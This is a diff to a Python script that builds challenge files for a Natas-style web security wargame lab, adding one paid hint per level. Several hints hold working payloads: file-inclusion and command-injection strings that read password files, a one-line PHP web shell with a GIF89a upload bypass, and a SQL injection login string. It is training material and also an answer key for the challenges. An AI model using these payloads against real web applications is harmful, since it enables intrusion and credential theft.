@@ -174,6 +174,29 @@ challenges_data = [
     }
 ]
 
+# One real, technique-specific hint per level (not natas-start-here --
+# its description is already a full walkthrough). See build_bandit.py's
+# HINTS comment for the quoting constraint (no literal double-quotes --
+# note this rules out double-quote-style SQLi/JSON payloads in hint text,
+# use single-quote syntax instead).
+HINTS = {
+    "natas-00": ("View the page's HTML source (Ctrl+U in a browser, or just `curl` it) -- the password is sitting in an HTML comment.", 15),
+    "natas-01": ("Right-click blocking is JavaScript running in your browser, not a server-side control. View-source or `curl` bypasses it entirely.", 15),
+    "natas-02": ("The embedded image is served from a subdirectory. Request that directory itself (e.g. `http://<target-host>:8002/files/`) to see what else lives there.", 20),
+    "natas-03": ("`curl http://<target-host>:8003/robots.txt`.", 25),
+    "natas-04": ("`curl -e 'http://natas5.natas.labs/' http://<target-host>:8004/` -- the exact next-level hostname the Referer needs to claim is shown in the page text.", 25),
+    "natas-05": ("Check the `Set-Cookie` header on your first request, then resend the request with that cookie's value changed (commonly a boolean-looking value like 0 flipped to 1).", 30),
+    "natas-06": ("Click 'View sourcecode' -- the PHP includes a file from a specific relative path. Request that exact path directly instead of going through the form.", 30),
+    "natas-07": ("Try `http://<target-host>:8007/index.php?page=/etc/natas_webpass/natas8` -- the page parameter is used directly as a filename to include.", 35),
+    "natas-08": ("View source for the encoding function's order of operations, then reverse it step by step in a shell: hex-decode first, then reverse the string, then base64-decode what's left.", 35),
+    "natas-09": ("Something like `?needle=;cat+/etc/natas_webpass/natas10` in the query string -- URL-encode the semicolon as %3B if your client mangles the raw character.", 40),
+    "natas-10": ("`grep` accepts a second filename argument on its own command line. A needle like `. /etc/natas_webpass/natas11 #` (a lone dot matches every line of the first file, then grep also searches the second filename you tacked on) needs no shell metacharacter at all.", 40),
+    "natas-11": ("The logged-out default cookie decodes to a known JSON plaintext (showpassword is 'no', a default bgcolor). XOR the decoded bytes against that known plaintext to recover the repeating key, then XOR-encrypt your own forged plaintext with showpassword set to 'yes'.", 45),
+    "natas-12": ("Upload a file containing `<?php system($_GET['c']); ?>`, then request it with `?c=cat+/etc/natas_webpass/natas13` appended.", 45),
+    "natas-13": ("Prepend the literal bytes `GIF89a` before your `<?php ... ?>` payload in the same uploaded file -- `exif_imagetype()` only inspects the first few bytes, not the whole file.", 50),
+    "natas-14": ("Try a username of `' OR '1'='1' -- ` (note the trailing space after the double-dash) to comment out the rest of the query.", 50),
+}
+
 # Generate folder and files
 script_dir = os.path.dirname(os.path.abspath(__file__))
 base_dir = os.path.abspath(os.path.join(script_dir, "..", "challenges"))
@@ -200,6 +223,14 @@ target_image: {NATAS_TARGET_IMAGE}
 attacker_image: {NATAS_ATTACKER_IMAGE}
 instance_group: {INSTANCE_GROUP}
 shutdown_on_solve: {"true" if is_final_level else "false"}
+"""
+
+    hint = HINTS.get(ch["id"])
+    if hint:
+        hint_content, hint_cost = hint
+        yaml_content += f"""hints:
+  - content: "{hint_content}"
+    cost: {hint_cost}
 """
 
     file_path = os.path.join(folder_path, "challenge.yml")
